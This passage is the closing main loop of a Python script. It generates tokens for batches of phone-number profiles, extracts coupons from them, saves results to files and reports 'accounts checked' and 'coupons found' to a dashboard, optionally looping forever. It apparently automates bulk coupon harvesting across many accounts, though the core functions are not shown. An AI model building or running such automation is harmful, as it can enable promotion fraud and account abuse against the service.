                 print(f"📞 Using provided phone number: {specific_phone}")
                 
            results = generate_creator_tokens(profiles, concurrency, delay_ms)
            
            success_count = sum(1 for r in results if r['success'])
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=4, ensure_ascii=False)
                
            print(f"💾 Wrote {len(results)} response record(s) to {output_file}")
            print(f"✅ Success: {success_count} | ❌ Failed: {len(results) - success_count}")
            
            extracted_coupons = extract_coupons_from_tokens(results, coupon_file, coupon_concurrency)
            
            if extracted_coupons:
                print(f"🎟️ Saved {len(extracted_coupons)} coupon(s) to {coupon_file}")
            else:
                print(f"⚠️ No coupons extracted; {coupon_file} left empty.")
                
            if update_json_file:
                try:
                     updated_count = apply_tokens_to_json(update_json_file, results, country_code)
                     if updated_count > 0:
                         entry_word = 'entry' if updated_count == 1 else 'entries'
                         print(f"📝 Updated {updated_count} {entry_word} in {update_json_file}")
                     else:
                         print(f"⚠️ No matching entries updated in {update_json_file}; ensure phone numbers align.")
                except Exception as e:
                     sys.stderr.write(f"Failed to update {update_json_file}: {e}\n")
                     sys.exit(1)
            
            # Update cumulative stats
            total_accounts_checked += len(results)
            total_coupons_found += len(extracted_coupons)
            
            # Update web dashboard statistics
            if WEB_DASHBOARD_AVAILABLE and dashboard_url:
                web_dashboard.update_stats(
                    batch=batch_number,
                    total_accounts=total_accounts_checked,
                    total_coupons=total_coupons_found,
                    current_batch_accounts=len(results),
                    current_batch_coupons=len(extracted_coupons)
                )
            
            if loop_mode:
                print(f"\n{'='*60}")
                print(f"📊 BATCH #{batch_number} COMPLETE")
                print(f"{'='*60}")
                print(f"Batch Stats: {len(results)} accounts checked, {len(extracted_coupons)} coupons found")
                print(f"Cumulative: {total_accounts_checked} total accounts, {total_coupons_found} total coupons")
                print(f"{'='*60}\n")
            else:
                # Non-loop mode: exit after first iteration
                break
                
    except KeyboardInterrupt:
        print(f"\n\n{'='*60}")
        print(f"⚠️  STOPPED BY USER (Ctrl+C)")
        print(f"{'='*60}")
        if loop_mode and batch_number > 0:
            print(f"Completed {batch_number} batch(es)")
            print(f"Total accounts checked: {total_accounts_checked}")
            print(f"Total coupons found: {total_coupons_found}")
            print(f"{'='*60}")
        sys.exit(0)

if __name__ == "__main__":
    main()
